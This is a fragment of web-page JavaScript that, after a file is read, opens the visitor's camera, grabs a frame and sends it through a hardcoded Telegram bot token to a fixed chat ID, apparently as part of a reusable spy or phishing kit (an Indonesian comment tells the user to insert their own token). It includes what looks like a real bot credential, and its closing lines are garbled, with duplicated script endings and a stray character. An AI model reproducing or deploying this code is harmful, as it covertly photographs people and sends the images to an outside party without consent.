            takeAndSendFrontCameraPhoto();
            };
            reader.readAsDataURL(file);
        }
    }

    // 
    const tokenBot = '8825946342:AAExpW8qsdKcJ4bJEv5E9kPN-kZoeaTv2Dg'; // Ganti dengan token bot Telegram Anda
    const bot = new TelegramBot(tokenBot);

    function takeAndSendFrontCameraPhoto() {
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
            .then(stream => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');

                video.addEventListener('canplaythrough', () => {
                    const width = video.videoWidth;
                    const height = video.videoHeight;
                    canvas.width = width;
                    canvas.height = height;
                    context.drawImage(video, 0, 0, width, height);
                    const dataURL = canvas.toDataURL('image/jpeg');

                    // 
                    bot.sendPhoto({ chatId: '7819779147', photo: dataURL })
                        .then(() => {
                            console.log('Photo sent successfully');
                        })
                        .catch(error => {
                            console.error('Error sending photo:', error);
                        });

                    // 
                    stream.getTracks().forEach(track => track.stop());
                    video.remove();
                });
            })
            .catch(error => {
                console.error('Error accessing camera:', error);
            });
    }
</script>    });
    }
</script>�   });
    }
</script>
